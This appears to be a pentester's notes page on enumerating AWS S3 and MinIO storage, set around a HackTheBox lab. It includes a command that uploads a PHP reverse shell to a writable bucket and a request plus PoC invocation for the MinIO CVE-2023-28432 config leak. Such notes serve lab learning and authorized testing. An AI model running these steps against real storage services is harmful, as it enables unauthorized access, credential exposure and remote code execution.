# AWS Buckets & S3-Compatible (MinIO)

* AWS provides the ability for clients to store a lot of data using a service called Simple Storage Service(S3).
* **MinIO** is S3-compatible object storage; it may listen on non-standard ports (e.g. 54321) and can be detected by the same tooling as S3.
* Files are stored on what are called buckets and these buckets can have insecure permissions:

## Here’s a break down of the following permissions:

* List objects: user with permissions can list the files in the bucket
* Write objects: user with permissions can add/remove files on the bucket
* Read bucket permissions: users with permissions can read files on the bucket
* Write bucket permissions: users with permissions can edit files on the bucket

### The permissions above apply to the bucket, but an administrator can also assign specific permissions to files/objects in the bucket.

#### An administrator can assign permissions in the following ways:

* For specific users
* For everyone
* In the past, the default S3 permissions were weak and S3 buckets would be publicly accessible but AWS changed this to block public access by default.

### AWS CLI Install

```
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

## Enumeration

* The first part of enumerating s3 buckets is having an s3 bucket name. How would you find an s3 bucket name:
* Source code on git repositories
* Sub domain enumeration
* Analyzing requests on web pages
* Some pages retrieve static resources from s3 buckets
* Domain name of product names:
* If a product or domain is called “servicename” then the s3 bucket may also be called “servicename”
* Once we have an s3 bucket, we can check if it’s publicly accessible by browsing to the URL. The format of the URL is:

```
bucketname.s3.amazonaws.com
```

* If you’ve found objects on an s3 bucket, you would want to download them to view their contents. You do this using the AWS CLI. To use the AWS CLI, you need to create an account.

### AWS Configure&#x20;

* Start by configuring aws on your local machine:

```
aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

### Connecting to an Endpoint&#x20;

* There are multiple ways to connect to an endpoint:

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws s3 ls s3://bucket-name
```

* The output will look something like:

```
2022-09-25 20:03:26 thetoppers.htb
```

### View s3 bucket files&#x20;

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-09-25 20:03:26          0 .htaccess
2022-09-25 20:03:26      11952 index.php

```

### Download Files

```
aws s3 cp s3://bucket-name/file-name local-location
```

* Alternatively, you can also use the following method to access a file:

```
bucketname.region-name.amazonaws.com/file-name
```

### Copy local files to s3

```
aws --endpoint=http://s3.thetoppers.htb s3 cp php-reverse-shell.php s3://thetoppers.htb 
upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php
```

---

## MinIO (S3-compatible)

### Identification

* **Nmap:** `Server: MinIO` and `X-Amz-Id-2`, `X-Amz-Request-Id` in HTTP responses; Golang net/http fingerprint.
* **Nuclei:** `nuclei -u target:54321 -as -rl 15 -c 50` can tag `aws-bucket-service`, `s3-detect`, `waf-detect:aws`.
* **Browser redirect:** MinIO console may redirect to another port (e.g. 9001); if that port is not open, use IP or API directly.
* **Invalid bucket probe:** `http://TARGET:54321/%c0` often returns `InvalidBucketName` / "bucket is not valid", confirming S3-compatible API.
* **crossdomain.xml:** `http://TARGET:54321/crossdomain.xml` may exist (Flash cross-domain policy).

### mc (MinIO Client)

```bash
# Add alias (use IP if hostname redirects to closed port)
mc alias set myminio http://TARGET_IP:54321
# Enter Access Key / Secret Key (or leave blank for anonymous)

# List buckets (may get Access Denied without creds)
mc ls myminio
```

### CVE-2023-28432 (MinIO info leak)

Bootstrap endpoint can leak env/config. Use **IP** in the exploit URL if the hostname redirects to a port you can’t reach:

```bash
curl http://TARGET_IP:54321/minio/bootstrap/v1/verify
# Exploit PoC: https://github.com/Chocapikk/CVE-2023-28432
python3 exploit.py --verbose -u http://TARGET_IP:54321
```
